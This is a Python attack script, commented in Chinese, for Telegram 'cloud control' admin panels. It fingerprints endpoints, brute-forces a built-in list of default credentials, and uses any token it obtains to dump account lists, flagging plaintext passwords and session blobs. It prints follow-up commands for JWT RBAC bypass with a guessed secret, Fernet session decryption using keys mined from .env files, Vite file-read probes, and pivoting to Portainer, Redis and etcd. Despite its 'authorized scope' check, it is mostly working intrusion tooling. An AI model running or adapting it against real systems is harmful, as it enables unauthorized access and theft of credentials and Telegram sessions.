#!/usr/bin/env python3
"""TG 云控面板表面探针（授权范围内）。

指纹常见端口/标题 → 弱口 admin/admin（JSON + form）→ 标 session/Fernet/openapi/Vite。
并行认 JWT 第三族（/proxy/list /admin/users）；命中则交接 jwt_gql + rbac，不打 Fernet。
不默认改密码、不踢设备、不写 webhook。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from jwt_mask import extract_masked_tokens, is_masked_session_token  # noqa: E402
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-tg-cloud-panel"
CREDS = (("admin", "admin"), ("admin", "123456"), ("root", "root"), ("admin", "336886zxs"))
PATH_HINTS = (
    "/",
    "/docs",
    "/openapi.json",
    "/api/docs",
    "/redoc",
    "/api/v1/accounts",
    "/api/accounts",
    "/api/users",
    "/admin",
    "/login",
    "/api/login",
    "/api/auth/login",
    "/ai/health",
    "/api/monitor/system",
    "/proxy/list",
    "/admin/users",
    "/admin/login-logs",
    "/login-logs",
    "/main.wasm",
)
JWT_FAMILY_PATHS = frozenset(
    ("/proxy/list", "/admin/users", "/admin/login-logs", "/login-logs")
)
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*")
TITLE_RX = re.compile(
    r"(sticker|telegram|tg\s*panel|auto\s*sender|forwarder|pyrogram|telethon|"
    r"cloud.?control|云控|promotion)",
    re.I,
)
WASM_RX = re.compile(r"goEncrypt|goDecrypt|main\.wasm|taskProtocolRecovery|clienter/pageList", re.I)
LIST_PWD_PATHS = (
    "/api/clienter/pageList",
    "/api/customer/pageList",
    "/clienter/pageList",
    "/api/account/importPageList",
)
SESSION_RX = re.compile(
    r"(session_string|StringSession|gAAAAA[A-Za-z0-9_\-]{20,}|1[Bb][A-Za-z0-9+/]{80,})",
)
FERNET_RX = re.compile(r"gAAAAA[A-Za-z0-9_\-]{40,}")
VITE_RX = re.compile(r"/@vite/client|vite/dist|__vite_ping", re.I)
# 明确失败信号
FAIL_RX = re.compile(
    r"(invalid|incorrect|unauthorized|forbidden|wrong\s*password|登录失败|"
    r'"success"\s*:\s*false|\"ok\"\s*:\s*false)',
    re.I,
)


def _req(
    sess: requests.Session, method: str, url: str, **kw: Any
) -> requests.Response | None:
    try:
        return sess.request(method, url, timeout=12, verify=False, allow_redirects=True, **kw)
    except Exception:
        return None


def _extract_jwt(text: str) -> str:
    if not text:
        return ""
    m = re.search(r'"(?:access_token|token|jwt)"\s*:\s*"(eyJ[^"]+)"', text)
    if m:
        return m.group(1)
    m = JWT_RE.search(text)
    return m.group(0) if m else ""


def _json_export_shape(text: str) -> bool:
    raw = (text or "").strip()
    if not raw:
        return False
    try:
        data = json.loads(raw)
    except Exception:
        return False
    if isinstance(data, list) and data:
        return True
    if not isinstance(data, dict):
        return False
    blob = raw.lower()
    if any(k in blob for k in ("socks", "proxy", "session", "phone", "tdata")):
        return True
    for key in ("items", "data", "list", "rows", "records", "users", "proxies"):
        val = data.get(key)
        if isinstance(val, list) and val:
            return True
        if isinstance(val, dict):
            for inner in ("items", "list", "rows", "records"):
                iv = val.get(inner)
                if isinstance(iv, list) and iv:
                    return True
    total = data.get("total", data.get("count"))
    return isinstance(total, (int, float)) and total > 0


def _login_ok(status: int, text: str, cookie: str) -> tuple[bool, list[str]]:
    """收紧判定：避免 HTML 登录页 / success:false 误报。"""
    if status not in (200, 201):
        return False, []
    low = text.lower()
    if FAIL_RX.search(text):
        return False, ["fail-signal"]
    # 明显还是登录表单
    if "<html" in low and ("type=\"password\"" in low or "type='password'" in low):
        if "access_token" not in low and '"token"' not in low:
            return False, ["still-login-html"]
    why: list[str] = []
    if re.search(r'"access_token"\s*:\s*"[^"]{8,}"', text):
        why.append("access_token")
    if re.search(r'"token"\s*:\s*"[^"]{8,}"', text) and "csrf" not in low:
        why.append("token-field")
    if re.search(r'"success"\s*:\s*true', text, re.I):
        why.append("success-true")
    if re.search(r"(authorization|set-cookie).{0,40}(bearer|jwt)", cookie + text, re.I):
        why.append("bearerish")
    # Set-Cookie 需同时有业务 JSON，避免纯会话 cookie 误报
    if any(x in cookie.lower() for x in ("access_token", "jwt", "auth_token")):
        why.append("auth-cookie")
    if why:
        return True, why
    return False, []


def _try_login(sess: requests.Session, base: str, user: str, pwd: str) -> tuple[list[dict[str, Any]], str]:
    payloads = [
        ("json", {"username": user, "password": pwd}),
        ("json", {"user": user, "password": pwd}),
        ("json", {"email": user, "password": pwd}),
        ("json", {"account": user, "password": pwd}),
        ("form", {"username": user, "password": pwd}),
        ("form", {"user": user, "password": pwd}),
        ("form", {"email": user, "password": pwd}),
    ]
    paths = (
        "/api/login",
        "/api/auth/login",
        "/login",
        "/api/v1/login",
        "/admin/login",
        "/api/admin/login",
    )
    for path in paths:
        for kind, body in payloads:
            url = urljoin(base + "/", path.lstrip("/"))
            if kind == "json":
                r = _req(sess, "POST", url, json=body, headers={"Content-Type": "application/json"})
            else:
                r = _req(
                    sess,
                    "POST",
                    url,
                    data=body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            if r is None or r.status_code >= 500:
                continue
            text = r.text or ""
            cookie = r.headers.get("Set-Cookie", "")
            ok, why = _login_ok(r.status_code, text, cookie)
            if ok:
                tok = _extract_jwt(text)
                return [
                    {
                        "path": path,
                        "kind": kind,
                        "user": user,
                        "password": pwd,
                        "status": r.status_code,
                        "why": why,
                        "has_token": bool(tok),
                        "snippet": text[:240],
                    }
                ], tok
    return [], ""


def run(base_url: str, case: str, out: Path | None, try_login: bool) -> dict[str, Any]:
    host = host_of(base_url)
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)
    base = base_url.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA

    surfaces: list[dict[str, Any]] = []
    blob_all = ""
    for path in PATH_HINTS:
        r = _req(sess, "GET", urljoin(base + "/", path.lstrip("/")))
        if r is None:
            continue
        text = r.text or ""
        blob_all += text[:8000] + "\n"
        row: dict[str, Any] = {
            "path": path,
            "status": r.status_code,
            "len": len(text),
            "title": "",
            "flags": [],
        }
        m = re.search(r"<title[^>]*>([^<]{1,120})</title>", text, re.I)
        if m:
            row["title"] = m.group(1).strip()
            if TITLE_RX.search(row["title"]):
                row["flags"].append("tg-title")
        if path.endswith("openapi.json") and r.status_code == 200 and '"paths"' in text:
            row["flags"].append("openapi")
        if SESSION_RX.search(text):
            row["flags"].append("session-leak")
        if FERNET_RX.search(text):
            row["flags"].append("fernet-ciphertext")
        if VITE_RX.search(text) or (path == "/" and "/@vite/" in text):
            row["flags"].append("vite-dev")
        if path == "/ai/health" and r.status_code == 200 and (
            "account" in text.lower() or "cache" in text.lower() or text.strip().startswith("{")
        ):
            row["flags"].append("ai-health")
        if path in JWT_FAMILY_PATHS:
            if r.status_code in (200, 201) and _json_export_shape(text):
                row["flags"].append("jwt-family-preauth-export")
            elif r.status_code in (401, 403):
                row["flags"].append("jwt-family-protected")
        if JWT_RE.search(text):
            row["flags"].append("jwt-in-body")
        if extract_masked_tokens(text):
            row["flags"].append("masked-jwt")
        if path.endswith(".wasm") and r.status_code == 200 and (
            (r.content or b"")[:4] == b"\x00asm" or "wasm" in (r.headers.get("content-type") or "").lower()
        ):
            row["flags"].append("go-wasm")
        if WASM_RX.search(text):
            row["flags"].append("wasm-aes-oracle")
        if (
            row["flags"]
            or (200 <= r.status_code < 400 and path in ("/", "/docs", "/openapi.json"))
            or path in JWT_FAMILY_PATHS
        ):
            surfaces.append(row)
            print(f"  [{r.status_code}] {path} flags={row['flags']} title={row['title'][:40]}")

    login_hits: list[dict[str, Any]] = []
    auth_tok = ""
    if try_login:
        for u, p in CREDS:
            login_hits, auth_tok = _try_login(sess, base, u, p)
            if login_hits:
                print(f"  [+] login ok {u}/{p} via {login_hits[0]['path']} ({login_hits[0]['kind']})")
                break
    if auth_tok and is_masked_session_token(auth_tok):
        flags_pre = {"masked-jwt-login"}
        print("  [+] login token is masked JWT (session lookup)")
    else:
        flags_pre = set()
    if auth_tok:
        hdr = {"Authorization": f"Bearer {auth_tok}", "token": auth_tok}
        for path in LIST_PWD_PATHS:
            r = _req(
                sess, "POST", urljoin(base + "/", path.lstrip("/")),
                headers={**hdr, "Content-Type": "application/json"},
                json={"page": 1, "pageSize": 10, "size": 10},
            )
            if r is None or r.status_code >= 400:
                continue
            text = r.text or ""
            row = {"path": path, "status": r.status_code, "len": len(text), "title": "", "flags": ["authed"]}
            if re.search(r'"password"\s*:\s*"[^"$]{3,32}"', text) and "$2" not in text[:800]:
                row["flags"].append("plaintext-password-list")
            if "base64Data" in text or "authKey" in text or ".session" in text:
                row["flags"].append("session-import-blob")
            surfaces.append(row)
            print(f"  [{r.status_code}] {path} (authed) flags={row['flags']}")
        for path in sorted(JWT_FAMILY_PATHS):
            r = _req(sess, "GET", urljoin(base + "/", path.lstrip("/")), headers=hdr)
            if r is None:
                continue
            text = r.text or ""
            row = {
                "path": path,
                "status": r.status_code,
                "len": len(text),
                "title": "",
                "flags": ["authed"],
            }
            if r.status_code in (200, 201) and _json_export_shape(text):
                row["flags"].append("jwt-family-authed-export")
            surfaces.append(row)
            print(f"  [{r.status_code}] {path} (authed) flags={row['flags']}")

    next_steps = []
    flags_flat = {f for s in surfaces for f in s.get("flags") or []} | flags_pre
    if "your_secret_key" in blob_all or "your-secret-key" in blob_all:
        flags_flat.add("tutorial-jwt-secret-leak")
    jwt_family = bool(
        flags_flat
        & {
            "jwt-family-preauth-export",
            "jwt-family-protected",
            "jwt-family-authed-export",
            "jwt-in-body",
            "tutorial-jwt-secret-leak",
        }
    )
    wasm_family = bool(
        flags_flat
        & {
            "go-wasm",
            "wasm-aes-oracle",
            "masked-jwt",
            "masked-jwt-login",
            "plaintext-password-list",
        }
    )
    if wasm_family:
        next_steps.append(
            "第四族 Go WASM：有头浏览器拿 window.goEncrypt/goDecrypt，禁止先逆向 WASM"
        )
        next_steps.append(
            f"python3 炼蛊房/jwt_gql_probe.py -u {base_url} --case {case or 'CASE'} --token '<掩码票>'"
        )
        next_steps.append("Skill tg-cloud-panel 第四族 · 传承/飞鸽·掩票.md")
    if jwt_family:
        next_steps.append(
            f"python3 炼蛊房/jwt_gql_probe.py -u {base_url} --case {case or 'CASE'}"
            + (" --token '<JWT>'" if auth_tok or "jwt-in-body" in flags_flat else "")
        )
        next_steps.append(
            "python3 炼蛊房/rbac_bypass_probe.py --base "
            f"{base_url} --token '<JWT>' --jwt-secret your_secret_key --case {case or 'CASE'}"
        )
        next_steps.append("Skill tg-cloud-panel 第三族：勿打 Fernet/OSS；导出 session 验活")
    if "fernet-ciphertext" in flags_flat or FERNET_RX.search(blob_all):
        next_steps.append(
            "python3 炼蛊房/fernet_session_decrypt.py decrypt --token-file <json> --keys-file <候选钥>"
        )
        next_steps.append("Skill fernet-session-decrypt：从 .env/Vite@fs 挖 ENCRYPTION_KEY")
    if "vite-dev" in flags_flat:
        next_steps.append(
            f"python3 炼蛊房/vite_fs_probe.py -u {base_url} --case {case or 'CASE'}"
        )
    if login_hits:
        if jwt_family:
            next_steps.append("已弱口进入：先打 /proxy/list /admin/users；JWT 走 jwt_gql + rbac，勿默认 Fernet")
        else:
            next_steps.append("已弱口进入：枚举 accounts/session 导出；LIVE+Fernet → fernet-session-decrypt")
    if "openapi" in flags_flat:
        next_steps.append("拉 openapi 找 session/export/relay/admin 路由")
    if not next_steps:
        next_steps.append("无专卡指纹时并行 Portainer:9000 / Redis:6379 / WolfStack / etcd:2379")

    report = {
        "target": base_url,
        "ts": datetime.now(UTC).isoformat(),
        "surfaces": surfaces,
        "login_hits": login_hits,
        "flags": sorted(flags_flat),
        "playbook": "传承/飞鸽·云府.md",
        "skill": "杀招/太白云生·云台",
        "next": next_steps,
    }
    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="tg_cloud_panel", filename="probe.json"
    )
    print(json.dumps({"flags": report["flags"], "login": bool(login_hits), "out": str(out_path)}, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="TG 云控面板探针")
    ap.add_argument("-u", "--url", required=True, help="https://host:port")
    ap.add_argument("--case", default="", help="案卷名")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--no-login", action="store_true", help="只指纹不试弱口")
    args = ap.parse_args()
    run(args.url, args.case, args.out, try_login=not args.no_login)


if __name__ == "__main__":
    main()
